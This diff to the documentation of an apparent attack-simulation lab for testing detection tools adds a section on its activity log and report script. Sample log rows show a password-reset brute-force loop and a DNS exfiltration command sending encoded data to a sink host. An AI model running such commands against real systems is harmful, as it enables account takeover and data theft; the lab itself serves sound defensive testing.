@@ -2,11 +2,52 @@
 
 Everything beyond the quick-start guide in the [README](../README.md).
 
-Contents: [Safety design](#safety-design) · [Components](#components) ·
+Contents: [The activity log](#the-activity-log) · [Safety design](#safety-design) · [Components](#components) ·
 [Running pieces separately](#running-pieces-separately) ·
 [Stealth profiles](#stealth-profiles) ·
 [OWASP Top 10:2025 scenarios](#owasp-top-10-2025-scenarios) ·
 [MITRE ATT&CK coverage](#mitre-attck-coverage) · [Artifacts](#artifacts)
+
+## The activity log
+
+Every action a scenario performs is recorded in `results/activity.jsonl`,
+one JSON line each, and shown as a table at the bottom of every scenario,
+every chain, and the end of `run-everything.sh`:
+
+```
+Time          Technique  Command              Source       Destination   Path / ID
+09:43:44.808  OWASP-A06  curl -s -X GET       ops-console  web-portal    /reset?user=alice&code=0000 (x91 over 2s)
+09:41:15.898  T1048.003  dig +short @dns-sink A  ops-console  dns-sink   0.1794044475.ewogICJD…exfil.internal
+```
+
+| column | meaning |
+|---|---|
+| Time | UTC, millisecond precision |
+| Technique | ATT&CK technique ID, or `OWASP-Axx` |
+| Command | what was run or sent |
+| Source / Destination | container (compose service) names; the decoy metadata service is shown as `ops-console (decoy IMDS)`, and `docker` commands show `docker-sandbox` |
+| Path / ID | URL path, file path, DNS name, or other unique identifier |
+
+Under the table, **Attacks covered** lists every technique that ran, with
+its name and how many actions it comprised.
+
+Bursts of the same action (a brute-force loop, sequential IDs) are
+collapsed to one row with a count in the printed table. Nothing is lost:
+`activity.csv` and `activity.jsonl` hold every row and extra fields
+(`step`, `result`, `scenario`, `profile`).
+
+```bash
+python3 playbooks/activity-report.py results/activity.jsonl --full          # every row, as a table
+python3 playbooks/activity-report.py results/activity.jsonl --format csv    # CSV
+python3 playbooks/activity-report.py results/activity.jsonl --scenario run-owasp-top10
+python3 playbooks/activity-report.py results/activity.jsonl --since 1794044400   # epoch seconds
+```
+
+The log is written by plain bash built-ins on purpose: recording it never
+starts an extra process, so the bookkeeping cannot show up as attacker
+behaviour in your telemetry. Technique names come from
+`playbooks/techniques.tsv`. `activity.jsonl` accumulates across runs; the
+report from `run-everything.sh` covers only that run.
 
 ## Safety design
 
@@ -50,6 +91,7 @@ To report a problem, see [SECURITY.md](../SECURITY.md).
 | `services/webapp.py` | deliberately vulnerable decoy web app for the OWASP scenarios (`web-portal`) |
 | `playbooks/` | setup + one script per scenario |
 | `playbooks/lib-stealth.sh` | stealth profile definitions and helpers |
+| `playbooks/lib-activity.sh`, `playbooks/activity-report.py`, `playbooks/techniques.tsv` | the activity log: recording, table/CSV report, technique names |
 | `playbooks/run-stealth-sweep.sh` | runs the base chain at every stealth profile and prints a comparison |
 | `playbooks/run-owasp-top10.sh` | OWASP Top 10:2025 application-attack scenarios |
 
@@ -112,9 +154,9 @@ STEALTH_TIME_SCALE=0.01 ...                      # shrink every wait for quick d
 
 Override one dimension with `STEALTH_TIMING`, `STEALTH_TOOLING` or
 `STEALTH_ARTIFACTS` (e.g. `STEALTH=quiet STEALTH_TOOLING=noisy`).
-Every run appends `stealth_timeline.jsonl` to the results directory
-(timestamp, profile, ATT&CK technique, step), so you can line EDR/CDR
-alerts up against exactly what ran. The profile table is in one place:
+Every action is recorded in the [activity log](#the-activity-log), with
+the profile used, so you can line EDR/CDR alerts up against exactly what
+ran (`stealth_timeline.jsonl` keeps the older, step-level view). The profile table is in one place:
 `playbooks/lib-stealth.sh`.
 
 **Scope:** profiles only change *how* the existing decoy techniques are
